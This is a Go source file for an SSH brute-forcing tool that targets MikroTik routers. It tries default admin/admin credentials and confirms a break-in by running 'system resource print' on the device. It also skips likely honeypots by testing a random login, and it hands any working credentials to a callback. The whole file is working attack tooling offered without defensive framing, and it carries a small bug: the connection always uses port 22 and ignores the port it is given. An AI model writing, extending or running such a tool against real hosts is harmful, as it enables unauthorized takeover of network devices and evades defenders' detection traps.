package dnrt

import (
	"errors"
	"fmt"
	"net"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

type ServiceType int

const (
	ServiceSSH ServiceType = iota
)

type Bruteforcer interface {
	brute(net.IP, uint16)
}

func NewBruteforcer(serviceType ServiceType, callback BruteCallback) SSHBruteforcer {
	switch serviceType {
	case ServiceSSH:
		return SSHBruteforcer{
			callback: callback,
		}
	}

	return SSHBruteforcer{callback: callback}
}

type BruteResult struct {
	IP   net.IP
	Port uint16
	User string
	Pass string
}

type BruteCallback func(BruteResult)

func getUserList() []string {
	return []string{
		"admin",
	}
}

func getPassList() []string {
	return []string{
		"admin",
	}
}

type SSHBruteforcer struct {
	Bruteforcer
	callback BruteCallback
}

func (b SSHBruteforcer) brute(ip net.IP, port uint16) {
	var err error
	userList := getUserList()
	passList := getPassList()

	for _, user := range userList {
		for _, pass := range passList {
			err = checkSSH(ip, port, user, pass)
			if err != nil {
				if isFatalErrorSSH(err.Error()) {
					return
				}
				continue
			}

			// Honeypot/IoT detection using random username and password
			err = checkSSH(ip, port, "a75da392", "a75da392")
			if err == nil {
				return
			}

			b.callback(BruteResult{IP: ip, Port: port, User: user, Pass: pass})
			return
		}
	}
}

func checkSSH(ip net.IP, port uint16, user string, pass string) error {
	client, err := connectToHost(fmt.Sprintf("%s:%d", ip, 22), user, pass)
	if err != nil {
		return err
	}

	defer client.Close()

	result, _ := runCommand(client, "system resource print")
	if strings.Contains(result, "MikroTik") {
		return nil
	}

	return errors.New("Not a MikroTik")
}

func connectToHost(host string, user string, pass string) (*ssh.Client, error) {
	sshConfig := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Second,
	}

	client, err := ssh.Dial("tcp", host, sshConfig)
	if err != nil {
		return nil, err
	}

	return client, nil
}

func runCommand(client *ssh.Client, command string) (string, error) {
	session, err := client.NewSession()
	if err != nil {
		return "", err
	}

	time.AfterFunc(time.Second*5, func() {
		session.Close()
	})

	out, err := session.CombinedOutput(command)
	if err != nil {
		return "", err
	}

	session.Close()
	return string(out), nil
}

func isFatalErrorSSH(err string) bool {
	stopErrors := []string{
		"invalid packet length",
		"connection reset by peer",
		"handshake failed: EOF",
		"no common algorithm for client to server cipher",
		"i/o timeout",
		"network is unreachable",
		"no supported methods remain",
	}

	for _, fatalError := range stopErrors {
		if strings.Contains(err, fatalError) {
			return true
		}
	}

	return false
}
